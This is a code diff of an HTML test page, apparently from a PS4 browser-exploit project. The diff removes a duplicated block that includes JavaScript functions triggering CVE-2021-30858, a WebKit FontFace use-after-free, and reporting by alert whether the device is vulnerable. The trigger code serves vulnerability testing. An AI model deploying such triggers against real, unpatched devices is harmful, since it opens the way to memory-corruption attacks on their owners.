@@ -47,74 +47,7 @@
                 alert(e);
             }
 }
-
     </script>
-
-    <body>
-        <center>
-            <br>
-        <img src="https://wallpapercrafter.com/th800/76813-mr-robot-tv-shows-hd-4k.jpg">
-        <br>
-        <button class="button" onclick="testwebkit()">CVE ON PS4 Browser 8.XX</button>
-            <button class="button" onclick="testwebkit2()">WEBKIT TEST (PS4, iOS)</button><br>
-            <button class="button" onclick="testwebkit4()">DON'T CLICK IT'S A TEST</button><br>
-                    <p2 style="color:#E6E6FA">CVE-2021-30858: Use-after-free in WebKit / Credit: @KameleonRe</p2>
-        </center>
-    </body>
-
-</html>
-<html>
-    <title>Webkit 8.xx Testing</title>
-    <style>
-        body {
-            background-image: url("https://wallpapercave.com/wp/wp4539336.png");
-        }
-        .button {
-          background-color: #FF00FF;
-          border-radius: 12px;
-          color: black;
-          padding: 15px 32px;
-          text-align: center;
-          text-decoration: none;
-          display: inline-block;
-          font-size: 16px;
-          margin: 4px 2px;
-          cursor: pointer;
-        }
-        </style>
-    <script>
-        
-        async function testwebkit() {
-            try{
-            alert("Testing CVE-2021-30858 on PS4 8.XX, Press OK ! (Work on IOS)");
-            let font = new FontFace('font1', 'url()',{});
-            alert("FontFace(). Test 1 OK!");
-            var fontFaceSet = new FontFaceSet([font]);
-            alert("FontFaceSet(). Test 2 OK!");
-            
-            font.family = 'font2';
-            alert("CVE-2021-30858 WEBKIT WORK ON YOUR SYSTEM!");
-              }
-            catch(e){
-                alert(e);
-            }
-        }
-
-        async function testwebkit2() {
-            try{
-            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Memory Errors'.\n If 'Bug Patched' Msgs or 'Memory Error Msg' is show means this bug does not work on your current FW and has been patched!!!\nIf you get 'The String did not match the expected pattern it's OK, Means it's working as expected! :P '");
-            let font = new FontFace('font1','',{});
-            var fontFaceSet = new FontFaceSet([font]);
-            font.family = 'font2';
-            alert("Bug Patched :(");
-               }
-            catch(e){
-                alert(e);
-            }
-}
-
-    </script>
-
     <body>
         <center>
             <br>
@@ -125,5 +58,4 @@
                     <p2 style="color:#E6E6FA">CVE-2021-30858: Use-after-free in WebKit / Credit: @KameleonRe</p2>
         </center>
     </body>
-
 </html>
